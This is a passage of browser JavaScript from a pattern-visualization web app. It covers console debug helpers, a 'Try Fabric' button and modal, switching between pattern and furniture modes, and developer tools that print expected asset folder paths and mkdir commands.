            console.log(`  ✅ ${key}: found`);
        } else {
            console.error(`  ❌ ${key}: NOT FOUND - missing element with id ""${key}""`);
        }
    });
}

// Watch changes to patternName
const patternNameElement = document.getElementById(""patternName"");
Object.defineProperty(dom, 'patternName', {
    get() {
        return patternNameElement;
    },
    set(value) {
        console.log(""Setting #patternName to:"", value, ""Caller:"", new Error().stack.split('\n')[2].trim());
        patternNameElement.textContent = value;
    },
    configurable: true
});

// Debug function to check what's happening with collection names
window.debugCollectionName = function() {
    console.log(`🔍 COLLECTION NAME DEBUG:`);
    console.log(`========================`);
    console.log(`Current collection name: ""${appState.selectedCollection?.name}""`);
    console.log(`Current pattern name: ""${appState.currentPattern?.name}""`);
    console.log(`Furniture mode: ${appState.furnitureMode}`);
    
    if (appState.furnitureMode) {
        console.log(`Original collection: ""${appState.originalCollection?.name}""`);
        console.log(`Original collection exists: ${!!appState.originalCollection?.fullCollection}`);
        
        // Check if we can get the original collection name from the furniture collection
        const originalFromFurniture = appState.selectedCollection?.originalCollectionName;
        console.log(`Original collection from furniture collection: ""${originalFromFurniture}""`);
    }
    
    // Test what the path should be
    if (appState.selectedCollection && appState.currentPattern) {
        let collectionNameForPaths;
        
        if (appState.furnitureMode) {
            // Try multiple ways to get the original collection name
            collectionNameForPaths = appState.originalCollection?.name 
                || appState.selectedCollection?.originalCollectionName
                || ""UNKNOWN"";
        } else {
            collectionNameForPaths = appState.selectedCollection.name;
        }
        
        const patternName = appState.currentPattern.name;
        const slug = createPatternSlug(patternName);
        
        console.log(`Expected path structure:`);
        console.log(`  Collection for paths: ""${collectionNameForPaths}""`);
        console.log(`  Pattern: ""${patternName}""`);
        console.log(`  Slug: ""${slug}""`);
        console.log(`  Should be: data/furniture/sofa-capitol/patterns/${collectionNameForPaths}/${slug}/`);
        
        if (collectionNameForPaths === ""UNKNOWN"") {
            console.error(`❌ Cannot determine original collection name!`);
            console.error(`   This is why paths are broken.`);
        }
    }
    
    return {
        selectedCollection: appState.selectedCollection?.name,
        currentPattern: appState.currentPattern?.name,
        furnitureMode: appState.furnitureMode,
        originalCollection: appState.originalCollection?.name
    };
};
window.getAppState = function() {
    return {
        selectedCollection: appState.selectedCollection?.name,
        currentPattern: appState.currentPattern?.name,
        furnitureMode: appState.furnitureMode,
        originalCollection: appState.originalCollection?.name,
        collections: appState.collections?.map(c => c.name),
        furnitureConfigLoaded: !!furnitureConfig
    };
};
window.fixOriginalCollection = function(originalCollectionName) {
    console.log(`🔧 QUICK FIX: Setting original collection to ""${originalCollectionName}""`);
    
    if (!appState.originalCollection) {
        appState.originalCollection = {};
    }
    
    appState.originalCollection.name = originalCollectionName;
    
    // Also store it in the furniture collection for future reference
    if (appState.selectedCollection) {
        appState.selectedCollection.originalCollectionName = originalCollectionName;
    }
    
    console.log(`✅ Fixed! Original collection name is now: ""${appState.originalCollection.name}""`);
    console.log(`Run debugCollectionName() to verify the fix.`);
    
    return {
        originalCollection: appState.originalCollection.name,
        furnitureCollection: appState.selectedCollection?.originalCollectionName
    };
};

// Status check accessible from console
window.checkStatus = function() {
    console.log(`🔍 FURNITURE IMPLEMENTATION STATUS CHECK:`);
    console.log(`======================================`);
    
    // Check if furniture config is loaded
    if (!furnitureConfig) {
        console.log(`❌ furnitureConfig not loaded`);
        return { error: ""furnitureConfig not loaded"" };
    }
    console.log(`✅ furnitureConfig loaded: ${Object.keys(furnitureConfig).length} furniture pieces`);
    
    // Check collections
    if (!appState.collections || appState.collections.length === 0) {
        console.log(`❌ Collections not loaded`);
        return { error: ""Collections not loaded"" };
    }
    console.log(`✅ Collections loaded: ${appState.collections.length} collections`);
    
    // Check current state
    const currentCollection = appState.selectedCollection?.name;
    if (!currentCollection) {
        console.log(`❌ No collection currently selected`);
        return { error: ""No collection selected"" };
    }
    console.log(`✅ Current collection: ${currentCollection}`);
    
    // Check compatibility
    const compatible = getCompatibleFurniture(currentCollection);
    console.log(`✅ Compatible furniture: ${compatible.length} pieces`);
    compatible.forEach(f => console.log(`   - ${f.name}`));
    
    // Check if Try Furniture button should be visible
    const tryButton = document.getElementById('tryFurnitureBtn');
    const backButton = document.getElementById('backToPatternsBtn');
    
    if (appState.furnitureMode) {
        console.log(`🪑 Currently in FURNITURE MODE`);
        console.log(`   Back button present: ${!!backButton}`);
    } else {
        console.log(`🎨 Currently in PATTERN MODE`);
        console.log(`   Try Furniture button present: ${!!tryButton}`);
        if (!tryButton && compatible.length > 0) {
            console.log(`⚠️  Try Furniture button should be visible but isn't!`);
        }
    }
    
    return {
        furnitureConfigLoaded: !!furnitureConfig,
        collectionsLoaded: appState.collections?.length > 0,
        currentCollection: currentCollection,
        compatibleFurniture: compatible.length,
        furnitureMode: appState.furnitureMode,
        tryButtonPresent: !!tryButton,
        backButtonPresent: !!backButton,
        originalCollection: appState.originalCollection?.name
    };
};

function ensureButtonsAfterUpdate() {
    // Small delay to ensure DOM update is complete
    setTimeout(() => {
        if (!appState.furnitureMode && !document.getElementById('tryFurnitureBtn')) {
            if (window.COLORFLEX_DEBUG) {
                console.log(""🔄 Re-adding Try Fabric button after room mockup update"");
            }
            addTryFurnitureButton();
        }
        
        if (appState.furnitureMode && !document.getElementById('backToPatternsBtn')) {
            if (window.COLORFLEX_DEBUG) {
                console.log(""🔄 Re-adding Back to Patterns button after room mockup update"");
            }
            addBackToPatternsButton();
        }
    }, 50);
}

// Test pattern slug generation
window.testSlug = function(patternName) {
    const slug = createPatternSlug(patternName);
    console.log(`Pattern: ""${patternName}"" → Slug: ""${slug}""`);
    return slug;
};

// Simple state viewer
window.viewState = function() {
    const state = {
        selectedCollection: appState.selectedCollection?.name,
        currentPattern: appState.currentPattern?.name,
        furnitureMode: appState.furnitureMode,
        originalCollection: appState.originalCollection?.name,
        patterns: appState.selectedCollection?.patterns?.length,
        furnitureConfig: Object.keys(furnitureConfig || {})
    };
    
    console.table(state);
    return state;
};

// Debug functions available in development mode only
if (window.location.hostname === 'localhost' || window.location.hostname.includes('dev')) {
    console.log(`
🔧 DEBUG FUNCTIONS LOADED!
=========================

Available console commands:
• debugCollectionName() - Debug collection name issues
• fixOriginalCollection(""botanicals"") - Quick fix for collection name
• checkStatus() - Check implementation status  
• viewState() - View current app state
• testSlug(""Pattern Name"") - Test slug conversion
• getAppState() - Get simplified app state

Try running: debugCollectionName()
`);
}

// Create pattern slug from pattern name
function createPatternSlug(patternName) {
    return patternName
        .toLowerCase()
        .replace(/[^a-z0-9\s-]/g, '') // Remove special characters
        .replace(/\s+/g, '-')         // Replace spaces with hyphens
        .replace(/-+/g, '-')          // Remove multiple consecutive hyphens
        .replace(/^-|-$/g, '')        // Remove leading/trailing hyphens
        .trim();
}

window.simpleDebug = function() {
    console.log(`🔍 SIMPLE DEBUG:`);
    console.log(`================`);
    
    if (appState.furnitureMode) {
        console.log(`In furniture mode: YES`);
        console.log(`Current collection: ""${appState.selectedCollection?.name}""`);
        console.log(`Stored original collection: ""${appState.selectedCollection?.originalCollectionName}""`);
        console.log(`Current pattern: ""${appState.currentPattern?.name}""`);
        
        if (appState.selectedCollection?.originalCollectionName) {
            const slug = createPatternSlug(appState.currentPattern?.name || ""test"");
            console.log(`✅ Path should be: data/furniture/sofa-capitol/patterns/${appState.selectedCollection.originalCollectionName}/${slug}/`);
        } else {
            console.log(`❌ No original collection name stored!`);
        }
    } else {
        console.log(`In furniture mode: NO`);
        console.log(`Current collection: ""${appState.selectedCollection?.name}""`);
    }
};

// Quick fix function:
window.quickFix = function() {
    if (appState.furnitureMode && !appState.selectedCollection?.originalCollectionName) {
        // Try to guess the original collection from the furniture collection name
        const furnitureCollectionName = appState.selectedCollection?.name;
        if (furnitureCollectionName && furnitureCollectionName.includes(""BOTANICAL"")) {
            appState.selectedCollection.originalCollectionName = ""botanicals"";
            console.log(`🔧 Quick fix: Set original collection to ""botanicals""`);
            return true;
        }
    }
    return false;
};

window.fixPatternPaths = function() {
    if (appState.furnitureMode && appState.currentPattern) {
        const originalCollectionName = appState.selectedCollection.originalCollectionName;
        const furnitureConfig = appState.selectedCollection.furnitureConfig;
        
        console.log(`🔧 Regenerating pattern paths:`);
        console.log(`   Collection: ${originalCollectionName}`);
        console.log(`   Pattern: ${appState.currentPattern.name}`);
        
        // Re-create the furniture pattern with correct paths
        const correctedPattern = createFurniturePattern(
            appState.currentPattern.originalPattern || appState.currentPattern,
            furnitureConfig,
            originalCollectionName
        );
        
        // Update the current pattern
        appState.currentPattern = correctedPattern;
        
        // Update in the collection too
        const patternIndex = appState.selectedCollection.patterns.findIndex(p => p.id === correctedPattern.id);
        if (patternIndex !== -1) {
            appState.selectedCollection.patterns[patternIndex] = correctedPattern;
        }
        
        console.log(`✅ Pattern paths regenerated`);
        return correctedPattern;
    }
};


// Cache for furniture compatibility checks to improve performance
let furnitureCompatibilityCache = new Map();
let addFurnitureButtonDebounce = null;

function getCompatibleFurniture(collectionName) {
    // Check cache first to avoid repeated computations
    if (furnitureCompatibilityCache.has(collectionName)) {
        return furnitureCompatibilityCache.get(collectionName);
    }
    
    // Reduced logging for performance
    if (window.COLORFLEX_DEBUG) {
        console.log(`🪑 Checking furniture compatibility for collection: ${collectionName}`);
    }
    
    if (!furnitureConfig) {
        // Don't spam the console - only warn once per collection
        if (!furnitureCompatibilityCache.has(collectionName + '_warned')) {
            console.warn(""Furniture config not loaded yet"");
            furnitureCompatibilityCache.set(collectionName + '_warned', true);
        }
        return [];
    }
    
    const compatible = Object.entries(furnitureConfig)
        .filter(([furnitureId, config]) => {
            const isCompatible = config.compatibleCollections && 
                               config.compatibleCollections.includes(collectionName);
            return isCompatible;
        })
        .map(([furnitureId, config]) => ({
            id: furnitureId,
            name: config.name,
            thumbnail: config.thumbnail,
            description: config.description || '',
            config: config
        }));
    
    // Cache the result for future use
    furnitureCompatibilityCache.set(collectionName, compatible);
    
    if (window.COLORFLEX_DEBUG) {
        console.log(`Found ${compatible.length} compatible furniture pieces`);
    }
    return compatible;
}

function addTryFurnitureButtonDebounced() {
    // Debounce to prevent excessive calls
    if (addFurnitureButtonDebounce) {
        clearTimeout(addFurnitureButtonDebounce);
    }
    
    addFurnitureButtonDebounce = setTimeout(() => {
        addTryFurnitureButtonInternal();
    }, 100); // 100ms delay
}

// Legacy function name for backward compatibility
function addTryFurnitureButton() {
    addTryFurnitureButtonDebounced();
}

function addTryFurnitureButtonInternal() {
    // Performance optimization - avoid excessive logging unless in debug mode
    if (window.COLORFLEX_DEBUG) {
        console.log(""🪑 Adding Try Fabric button"");
    }
    
    // Remove existing button if present
    const existingButton = document.getElementById('tryFurnitureBtn');
    if (existingButton) {
        existingButton.remove();
    }
    
    // Check compatibility
    const currentCollection = appState.selectedCollection?.name;
    if (!currentCollection) {
        if (window.COLORFLEX_DEBUG) {
            console.log(""No current collection, skipping furniture button"");
        }
        return;
    }
    
    const compatibleFurniture = getCompatibleFurniture(currentCollection);
    if (compatibleFurniture.length === 0) {
        if (window.COLORFLEX_DEBUG) {
            console.log(""No compatible furniture found for"", currentCollection);
        }
        return;
    }
    
    // Create button
    const button = document.createElement('button');
    button.id = 'tryFurnitureBtn';
    button.className = 'try-furniture-btn';
    button.innerHTML = `
        <span class=""furniture-icon"">🪑</span>
        <span class=""button-text"">Try Fabric (${compatibleFurniture.length})</span>
    `;
    
    // Add styles
    button.style.cssText = `
        position: absolute;
        bottom: 10px;
        right: 10px;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        border: none;
        padding: 12px 18px;
        border-radius: 25px;
        font-family: 'Special Elite', monospace;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        gap: 8px;
        z-index: 100;
    `;
    
    // Add hover effects
    button.addEventListener('mouseenter', () => {
        button.style.transform = 'translateY(-2px)';
        button.style.boxShadow = '0 6px 20px rgba(0,0,0,0.3)';
    });
    
    button.addEventListener('mouseleave', () => {
        button.style.transform = 'translateY(0)';
        button.style.boxShadow = '0 4px 15px rgba(0,0,0,0.2)';
    });
    
    // Add click handler
    button.addEventListener('click', () => {
        showFurnitureModal(compatibleFurniture);
    });
    
    // Find the room mockup container and add button
    const roomMockup = document.getElementById('roomMockup');
    if (roomMockup) {
        // Make sure the container is positioned relatively
        if (getComputedStyle(roomMockup).position === 'static') {
            roomMockup.style.position = 'relative';
        }
        roomMockup.appendChild(button);
        console.log(""✅ Try Furniture button added to room mockup"");
    } else {
        console.error(""❌ Could not find room mockup container"");
    }
}

// 3. showFurnitureModal function (also referenced but missing)
function showFurnitureModal(compatibleFurniture) {
    console.log(""🪑 Showing furniture modal with"", compatibleFurniture.length, ""options"");
    
    // Remove existing modal
    const existingModal = document.getElementById('furnitureModal');
    if (existingModal) {
        existingModal.remove();
    }
    
    // Create modal overlay
    const modalOverlay = document.createElement('div');
    modalOverlay.id = 'furnitureModal';
    modalOverlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.7);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        animation: fadeIn 0.3s ease;
    `;
    
    // Create modal content
    const modalContent = document.createElement('div');
    modalContent.style.cssText = `
        background: white;
        border-radius: 15px;
        padding: 30px;
        max-width: 600px;
        width: 90%;
        max-height: 80%;
        overflow-y: auto;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        animation: slideUp 0.3s ease;
    `;
    
    // Modal header
    const header = document.createElement('div');
    header.innerHTML = `
        <h2 style=""margin: 0 0 20px 0; font-family: 'Special Elite', monospace; color: #333; text-align: center;"">
            Choose Furniture for ${toInitialCaps(appState.selectedCollection.name)}
        </h2>
    `;
    
    // Furniture grid
    const furnitureGrid = document.createElement('div');
    furnitureGrid.style.cssText = `
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 20px;
        margin-bottom: 20px;
    `;
    
    // Add furniture options
    compatibleFurniture.forEach(furniture => {
        const furnitureCard = document.createElement('div');
        furnitureCard.style.cssText = `
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            background: white;
        `;
        
        furnitureCard.innerHTML = `
            <img src=""${normalizePath(furniture.thumbnail)}"" alt=""${furniture.name}"" 
                 style=""width: 100%; height: 120px; object-fit: cover; border-radius: 8px; margin-bottom: 10px;""
                 onerror=""this.style.background='#f0f0f0'; this.style.display='flex'; this.style.alignItems='center'; this.style.justifyContent='center'; this.innerHTML='🪑';"">
            <h3 style=""margin: 10px 0 5px 0; font-family: 'Special Elite', monospace; font-size: 16px;"">${furniture.name}</h3>
            <p style=""margin: 0; font-size: 12px; color: #666; line-height: 1.4;"">${furniture.description}</p>
        `;
        
        // Hover effects
        furnitureCard.addEventListener('mouseenter', () => {
            furnitureCard.style.borderColor = '#667eea';
            furnitureCard.style.transform = 'translateY(-2px)';
            furnitureCard.style.boxShadow = '0 8px 25px rgba(0,0,0,0.1)';
        });
        
        furnitureCard.addEventListener('mouseleave', () => {
            furnitureCard.style.borderColor = '#e0e0e0';
            furnitureCard.style.transform = 'translateY(0)';
            furnitureCard.style.boxShadow = 'none';
        });
        
        // Click handler
        furnitureCard.addEventListener('click', () => {
            selectFurniture(furniture);
            modalOverlay.remove();
        });
        
        furnitureGrid.appendChild(furnitureCard);
    });
    
    // Cancel button
    const cancelButton = document.createElement('button');
    cancelButton.textContent = 'Cancel';
    cancelButton.style.cssText = `
        background: #ccc;
        color: #333;
        border: none;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
        font-family: 'Special Elite', monospace;
        display: block;
        margin: 0 auto;
    `;
    
    cancelButton.addEventListener('click', () => {
        modalOverlay.remove();
    });
    
    // Assemble modal
    modalContent.appendChild(header);
    modalContent.appendChild(furnitureGrid);
    modalContent.appendChild(cancelButton);
    modalOverlay.appendChild(modalContent);
    
    // Close on overlay click
    modalOverlay.addEventListener('click', (e) => {
        if (e.target === modalOverlay) {
            modalOverlay.remove();
        }
    });
    
    // Add CSS animations
    const style = document.createElement('style');
    style.textContent = `
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    `;
    document.head.appendChild(style);
    
    document.body.appendChild(modalOverlay);
}

// 4. selectFurniture function
function selectFurniture(selectedFurniture) {
    console.log(""🪑 Selected furniture:"", selectedFurniture.name);
    console.log(""🧵 Full furniture object:"", selectedFurniture);
    
    // Store selected furniture in appState
    appState.selectedFurniture = selectedFurniture;
    appState.isInFabricMode = selectedFurniture.name === ""Fabric"";
    
    // Direct check for fabric name
    if (selectedFurniture.name === ""Fabric"") {
        console.log(""🧵 ================================"");
        console.log(""🧵 FABRIC NAME DETECTED - CALLING FABRIC MOCKUP"");
        console.log(""🧵 ================================"");
        renderFabricMockup();
        return;
    }
    
    // Switch to furniture mode for actual furniture
    console.log(""🪑 Regular furniture selected, switching to furniture mode"");
    switchToFurnitureMode(selectedFurniture);
}

// 5. addBackToPatternsButton function
function addBackToPatternsButton() {
    console.log(""🔙 addBackToPatternsButton() called"");
    
    const existingButton = document.getElementById('backToPatternsBtn');
    if (existingButton) {
        console.log(""🗑️ Removing existing back button"");
        existingButton.remove();
    }
    
    const button = document.createElement('button');
    button.id = 'backToPatternsBtn';
    button.innerHTML = `
        <span>← Back to Patterns</span>
    `;
    
    button.style.cssText = `
        position: absolute;
        bottom: 10px;
        left: 10px;
        background: linear-gradient(135deg, #ff7b7b 0%, #667eea 100%);
        color: white;
        border: none;
        padding: 12px 18px;
        border-radius: 25px;
        font-family: 'Special Elite', monospace;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        transition: all 0.3s ease;
        z-index: 100;
    `;
    
    console.log(""🔗 Adding click event listener to back button"");
    button.addEventListener('click', (event) => {
        console.log(""🔙 Back button clicked!"");
        event.stopPropagation(); // Prevent zoom handler from receiving this event
        event.preventDefault();  // Prevent any default behavior
        
        // Check if we're in fabric mode or furniture mode
        if (appState.isInFabricMode) {
            console.log(""🧵 Returning from fabric mode to patterns"");
            returnToPatternsModeFromFabric();
        } else {
            console.log(""🪑 Returning from furniture mode to patterns"");
            returnToPatternsMode();
        }
    });
    
    const roomMockup = document.getElementById('roomMockup');
    if (roomMockup) {
        roomMockup.appendChild(button);
        console.log(""✅ Back button added to DOM"");
        
        // Test if button is actually clickable
        console.log(""🧪 Button in DOM:"", document.getElementById('backToPatternsBtn'));
        console.log(""🧪 Button parent:"", document.getElementById('backToPatternsBtn')?.parentElement);
    } else {
        console.error(""❌ roomMockup not found!"");
    }
}

// Function to return from fabric mode to patterns mode
function returnToPatternsModeFromFabric() {
    console.log(""🧵 Returning from fabric mode to patterns"");
    
    // Clear fabric mode state
    appState.selectedFurniture = null;
    appState.isInFabricMode = false;
    
    // Remove back button
    const backButton = document.getElementById('backToPatternsBtn');
    if (backButton) {
        backButton.remove();
    }
    
    // Remove fabric tuning controls
    removeFabricTuningControls();
    
    // Re-add try furniture button
    addTryFurnitureButton();
    
    // Trigger room mockup update to show regular pattern view
    if (appState.currentPattern) {
        updateRoomMockup();
    }
    
    console.log(""✅ Returned from fabric mode to patterns mode"");
}

// 6. initializeTryFurnitureFeature function
function initializeTryFurnitureFeature() {
    console.log(""🪑 Initializing Try Furniture feature"");
    
    // Add the button when a collection is loaded
    if (appState.selectedCollection && !appState.furnitureMode) {
        addTryFurnitureButton();
    }
}

// Resolve furniture pattern paths using collection-based structure
function resolveFurniturePatternPaths(furnitureConfig, collectionName, patternName, originalPatternLayers) {
    console.log(`🔍 Resolving furniture pattern paths:`);
    console.log(`   Collection: ""${collectionName}""`);
    console.log(`   Pattern: ""${patternName}""`);
    
    // ✅ VALIDATION: Make sure we have a valid collection name
    if (!collectionName || collectionName === ""UNKNOWN"" || collectionName === patternName) {
        console.error(`❌ Invalid collection name: ""${collectionName}""`);
        console.error(`   Pattern name: ""${patternName}""`);
        console.error(`   These should be different!`);
        
        // Try to get it from the current furniture collection
        const fallbackCollectionName = appState.selectedCollection?.originalCollectionName;
        if (fallbackCollectionName) {
            console.log(`🔧 Using fallback collection name: ""${fallbackCollectionName}""`);
            collectionName = fallbackCollectionName;
        } else {
            console.error(`❌ No fallback collection name available!`);
            return [];
        }
    }
    
    const patternSlug = createPatternSlug(patternName);
    
    // Replace template variables
    const patternFolder = furnitureConfig.patternPathTemplate
        .replace('{collection}', collectionName)
        .replace('{patternSlug}', patternSlug);
    
    console.log(`   Pattern slug: ""${patternSlug}""`);
    console.log(`   ✅ Final folder: ""${patternFolder}""`);
    
    // Map layers to furniture paths
    const furniturePatternLayers = originalPatternLayers.map((layer, index) => {
        const originalFileName = layer.path.split('/').pop();
        const layerName = originalFileName.replace(/\.[^/.]+$/, '');
        const cleanLayerName = layerName.replace(/^[^_]*_/, ''); // Remove everything before first underscore
        const furnitureFileName = `${patternSlug}_${cleanLayerName}.png`;
        const furniturePath = `${patternFolder}${furnitureFileName}`;
        
        return {
            ...layer,
            path: furniturePath,
            originalPath: layer.path,
            furnitureFileName: furnitureFileName
        };
    });
    
    return furniturePatternLayers;
}


function createFurniturePattern(originalPattern, furnitureConfig, collectionName) {
    console.log(`🔄 Creating furniture pattern:`);
    console.log(`   Pattern: ${originalPattern.name}`);
    console.log(`   Collection: ${collectionName}`);
    console.log(`   Furniture: ${furnitureConfig.name}`);
    
    // ✅ VERIFY: Make sure collectionName is correct
    if (!collectionName || collectionName === originalPattern.name) {
        console.error(`❌ COLLECTION NAME ERROR!`);
        console.error(`   Expected collection name like ""botanicals""`);
        console.error(`   Got: ""${collectionName}""`);
        console.error(`   Pattern name: ""${originalPattern.name}""`);
        console.error(`   These should be different!`);
    }
    
    const furniturePatternLayers = resolveFurniturePatternPaths(
        furnitureConfig, 
        collectionName,           // ← This should be ""botanicals""
        originalPattern.name,     // ← This should be ""Key Largo""
        originalPattern.layers || []
    );
    
    const furniturePattern = {
        ...originalPattern,
        layers: furniturePatternLayers,
        isFurniture: true,
        furnitureConfig: furnitureConfig,
        originalPattern: originalPattern,
        collectionName: collectionName // Store collection name for reference
    };
    
    console.log(`✅ Created furniture pattern with ${furniturePatternLayers.length} layers`);
    console.log(`   Expected path pattern: data/furniture/.../patterns/${collectionName}/${createPatternSlug(originalPattern.name)}/`);
    
    return furniturePattern;
}


// Updated switchToFurnitureMode function
function switchToFurnitureMode(furniture) {
    console.log(""🔄 Switching to furniture mode for:"", furniture.name);
    
    // ✅ SIMPLE: Just grab the current collection name RIGHT NOW
    const originalCollectionName = appState.selectedCollection.name;
    console.log(`📝 Original collection name: ""${originalCollectionName}""`);
    
    // Store the ENTIRE original collection
    appState.originalCollection = { ...appState.selectedCollection };
    
    // Convert all patterns to furniture patterns using the CURRENT collection name
    const furniturePatterns = appState.selectedCollection.patterns.map(pattern => {
        return createFurniturePattern(pattern, furniture.config, originalCollectionName);
    });
    
    // Create virtual furniture collection
    const furnitureCollection = {
        name: `${originalCollectionName.toUpperCase()} ${furniture.name.toUpperCase()}`,
        patterns: furniturePatterns,
        curatedColors: appState.selectedCollection.curatedColors,
        coordinates: [],
        mockup: null,
        furnitureType: furniture.id,
wallMask: furniture.config.wallMask || ""default-wall-mask.png"",  // ← Ensure it's not null
        // ✅ SIMPLE: Store the original collection name directly
        originalCollectionName: originalCollectionName,
        furnitureConfig: furniture.config
    };
    
    // Update app state
    appState.selectedCollection = furnitureCollection;
    appState.furnitureMode = true;
    
    console.log(`✅ Switched to furniture mode. Paths will use: ""${originalCollectionName}""`);
    
    // Update UI
    if (dom.collectionHeader) {
        dom.collectionHeader.textContent = furnitureCollection.name;
    }
    
    // Remove try furniture button and add back button
    const tryButton = document.getElementById('tryFurnitureBtn');
    if (tryButton) tryButton.remove();
    addBackToPatternsButton();
    
    // Trigger re-render
    if (appState.currentPattern) {
        const furniturePattern = furniturePatterns.find(p => p.id === appState.currentPattern.id);
        if (furniturePattern) {
            loadPatternData(appState.selectedCollection, furniturePattern.id);
        }
    }
}

function returnToPatternsMode() {
    console.log(""🔄 Returning to patterns mode"");
    
    // Restore original collection
    if (appState.originalCollection) {
        console.log(""🔄 Restoring original collection:"", appState.originalCollection.name);
        
        appState.selectedCollection = appState.originalCollection; // Remove .fullCollection
        appState.furnitureMode = false;
        appState.originalCollection = null;
        
        // Clear fabric mode state
        appState.selectedFurniture = null;
        appState.isInFabricMode = false;
        
        // Update UI
        if (dom.collectionHeader) {
            dom.collectionHeader.textContent = toInitialCaps(appState.selectedCollection.name);
        }
        
        // Remove back button
        const backButton = document.getElementById('backToPatternsBtn');
        if (backButton) {
            backButton.remove();
        }
        
        // Re-add try furniture button
        addTryFurnitureButton();
        
        // Trigger re-render in patterns mode
        if (appState.currentPattern) {
            // Find the original pattern (not the furniture version)
            const originalPattern = appState.selectedCollection.patterns.find(p => p.id === appState.currentPattern.id);
            if (originalPattern) {
                loadPatternData(appState.selectedCollection, originalPattern.id);
            }
        }
        
        console.log(""✅ Returned to patterns mode"");
    } else {
        console.error(""❌ Cannot return to patterns mode - original collection not found"");
    }
}


// Development helper: Generate expected folder structure
function generateFolderStructure(collectionName, furnitureId) {
    const collection = appState.collections?.find(c => c.name === collectionName);
    const furniture = furnitureConfig?.[furnitureId];
    
    if (!collection || !furniture) {
        console.error(""❌ Collection or furniture not found"");
        return;
    }
    
    console.log(`📁 FOLDER STRUCTURE for ${furniture.name} + ${collectionName}:`);
    console.log(`📁 Base path: data/furniture/${furnitureId}/patterns/${collectionName}/`);
    console.log(`📁 Folders needed:`);
    
    const folders = [];
    collection.patterns.forEach(pattern => {
        const slug = createPatternSlug(pattern.name);
        const folder = `data/furniture/${furnitureId}/patterns/${collectionName}/${slug}/`;
        folders.push({
            pattern: pattern.name,
            slug: slug,
            folder: folder
        });
        console.log(`   ${folder}`);
    });
    
    console.log(`📊 Total folders needed: ${folders.length}`);
    return folders;
}

// Development helper: Check what files are expected for a pattern
function getExpectedFiles(collectionName, patternName, furnitureId) {
    const collection = appState.collections?.find(c => c.name === collectionName);
    const pattern = collection?.patterns.find(p => p.name === patternName);
    const furniture = furnitureConfig?.[furnitureId];
    
    if (!pattern || !furniture) {
        console.error(""❌ Pattern or furniture not found"");
        return;
    }
    
    const slug = createPatternSlug(patternName);
    const folder = `https://so-animation.com/colorflex/data/furniture/${furnitureId}/patterns/${collectionName}/${slug}/`;
    
    console.log(`📋 EXPECTED FILES for ${patternName} on ${furniture.name}:`);
    console.log(`📁 Folder: ${folder}`);
    console.log(`📄 Files needed:`);
    
    const expectedFiles = [];
    if (pattern.layers) {
        pattern.layers.forEach((layer, index) => {
            const originalFileName = layer.path.split('/').pop();
            const layerName = originalFileName.replace(/\.[^/.]+$/, '');
            const furnitureFileName = `${slug}-${layerName}.png`;
            expectedFiles.push({
                original: originalFileName,
                furniture: furnitureFileName,
                fullPath: `${folder}${furnitureFileName}`
            });
            console.log(`   ${furnitureFileName}`);
        });
    }
    
    return {
        folder: folder,
        files: expectedFiles
    };
}
// 1. Console commands for planning your work
window.workflowHelpers = {
    
    // See all expected folders for a furniture + collection combo
    showFolders: function(furnitureId, collectionName) {
        console.log(`📁 FOLDER STRUCTURE: ${furnitureId} + ${collectionName}`);
        return generateFolderStructure(collectionName, furnitureId);
    },
    
    // See expected files for a specific pattern
    showFiles: function(collectionName, patternName, furnitureId) {
        console.log(`📄 EXPECTED FILES: ${patternName} on ${furnitureId}`);
        return getExpectedFiles(collectionName, patternName, furnitureId);
    },
    
    // Get overview of all work needed
    showPlan: function() {
        console.log(`🎨 COMPLETE RENDERING PLAN`);
        return generateRenderingPlan();
    },
    
    // Test pattern slug generation
    testSlug: function(patternName) {
        const slug = createPatternSlug(patternName);
        console.log(`Pattern: ""${patternName}"" → Slug: ""${slug}""`);
        return slug;
    },
    
    // Check what's compatible
    showCompatibility: function() {
        console.log(`🔗 FURNITURE COMPATIBILITY:`);
        Object.entries(furnitureConfig || {}).forEach(([furnitureId, furniture]) => {
            console.log(`${furniture.name}: ${furniture.compatibleCollections.join(', ')}`);
        });
    },
    
    // Generate folder creation script
    generateFolderScript: function(furnitureId) {
        const furniture = furnitureConfig?.[furnitureId];
        if (!furniture) {
            console.error(`❌ Furniture ${furnitureId} not found`);
            return;
        }
        
        console.log(`📜 FOLDER CREATION SCRIPT for ${furniture.name}:`);
        console.log(`# Copy and paste these commands to create folders:\n`);
        
        let script = `# Furniture: ${furniture.name}\n`;
        script += `mkdir -p data/furniture/${furnitureId}/patterns\n\n`;
        
        furniture.compatibleCollections.forEach(collectionName => {
            const collection = appState.collections?.find(c => c.name === collectionName);
            if (!collection) return;
            
            script += `# Collection: ${collectionName}\n`;
            script += `mkdir -p data/furniture/${furnitureId}/patterns/${collectionName}\n`;
            
            collection.patterns.forEach(pattern => {
                const slug = createPatternSlug(pattern.name);
                script += `mkdir -p data/furniture/${furnitureId}/patterns/${collectionName}/${slug}\n`;
            });
            script += `\n`;
        });
        
        console.log(script);
        return script;
    }
};

// 2. Development status checker
function checkFurnitureImplementationStatus() {
    console.log(`🔍 FURNITURE IMPLEMENTATION STATUS CHECK:`);
    console.log(`======================================`);
    
    // Check if furniture config is loaded
    if (!furnitureConfig) {
        console.log(`❌ furnitureConfig not loaded`);
        return;
    }
    console.log(`✅ furnitureConfig loaded: ${Object.keys(furnitureConfig).length} furniture pieces`);
    
    // Check collections
    if (!appState.collections || appState.collections.length === 0) {
        console.log(`❌ Collections not loaded`);
        return;
    }
    console.log(`✅ Collections loaded: ${appState.collections.length} collections`);
